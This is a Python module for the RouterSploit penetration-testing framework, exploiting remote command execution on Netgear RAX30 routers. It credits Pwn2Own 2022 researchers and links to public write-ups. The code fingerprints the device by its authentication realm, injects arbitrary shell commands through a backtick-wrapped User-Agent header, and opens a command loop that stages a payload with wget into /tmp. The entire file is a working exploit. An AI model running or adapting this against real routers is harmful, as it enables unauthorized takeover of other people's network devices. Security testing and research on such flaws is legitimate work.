from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Netgear RAX30 RCE",
        "description": "Module exploits remote command execution in Netgear RAX30 devices. If the target is "
                       "vulnerable, command loop is invoked that allows executing commands on operating system level.",
        "authors": (
            "Pwn2Own 2022 Toronto - multiple researchers", # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.synacktiv.com/en/publications/cool-vulns-dont-live-long-netgear-and-pwn2own.html",
            "https://claroty.com/team82/research/chaining-five-vulnerabilities-to-exploit-netgear-nighthawk-rax30-routers-at-pwn2own-toronto-2022",
            "https://mahaloz.re/2023/02/25/pwnagent-netgear.html",
        ),
        "devices": (
            "Netgear RAX30",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection - response is not available")

            shell(self, architecture="armle", method="wget", location="/tmp")
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        headers = {
            "User-Agent": "`{}`".format(cmd)
        }

        self.http_request(
            method="GET",
            path="/",
            headers=headers
        )
        return ""

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/"
        )

        if response and "WWW-Authenticate" in response.headers.keys() and \
          'Basic realm="RAX30"' in response.headers["WWW-Authenticate"]:
            return True

        return False

